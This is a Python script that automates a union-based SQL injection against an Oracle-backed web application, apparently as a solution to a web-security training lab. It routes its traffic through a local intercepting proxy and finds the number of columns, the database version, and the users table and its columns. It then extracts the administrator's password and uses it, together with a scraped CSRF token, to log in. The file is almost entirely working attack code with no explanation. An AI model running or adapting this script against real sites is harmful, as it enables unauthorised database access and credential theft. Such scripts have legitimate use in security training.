import re, sys, urllib3, requests
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def num(url):
    for i in range(1, 5):
        payload = f"' order by {i}--"
        r = requests.get(url+payload, verify=False, proxies=proxies)
        if r.status_code == 500: return i -1

def database(url):
    payload = "' union select null, banner FROM v$version--"
    r = requests.get(url+payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    version = soup.find(text=re.compile('Oracle Database.*'))
    return version


def table_name(url):
    payload = "' union select table_name, null from all_tables--"
    r = requests.get(url+payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    table_name = soup.find(text=re.compile('^USERS.*'))
    return table_name

def users_password(url, table):
    payload = f"' union select null, column_name FROM all_tab_columns WHERE table_name= '{table}'--"
    r = requests.get(url+payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    user_name_column = soup.find(text=re.compile('USERNAME.*'))
    password_column = soup.find(text=re.compile('PASSWORD.*'))
    return  user_name_column, password_column

def find_passwd(url, user_column, passwd_column, table):
    payload = f"'union select {user_column}, {passwd_column} from {table}--"
    r = requests.get(url + payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    passwd = soup.find(text='administrator').parent.find_next('td').contents[0]
    return passwd

def csrf_token(s, url):
    s = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(s.text, 'html.parser')
    return soup.find('input')['value']

def login(s, l_url, passwd):
    csrf = csrf_token(s, l_url)
    print(f'[+] csrf toke:{csrf}')
    data = {
        'csrf':csrf,
        'username':'administrator',
        'password':passwd,
    }
    r = s.post(l_url, data=data, verify=False, proxies=proxies)
    return True if "Log out" in r.text else False


def sqli(s, url, l_url):
    n = num(url)
    version = database(url)
    table = table_name(url)
    users_name, password_column = users_password(url, table)
    passwd = find_passwd(url, users_name, password_column, table)
    print(f'[+] Number columan in dababas {n}')
    print(f'[+] The database is {version[:15]}')
    print(f'[+] The username is stored in {users_name}')
    print(f'[+] The Password is stord in {password_column}')
    print(f'[+] The administrator password is {passwd}')

    return login(s, l_url, passwd)


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        l_url = sys.argv[2].strip()
    except:
        print("[*] Usage: %s <url>" % sys.argv[0])
        print('[*] Example: %s example.com' % sys.argv[0])
        sys.exit(-1)
    
    s = requests.session()
    print("[+] Login successfuly" if sqli(s, url, l_url) else "[-] Login Faile")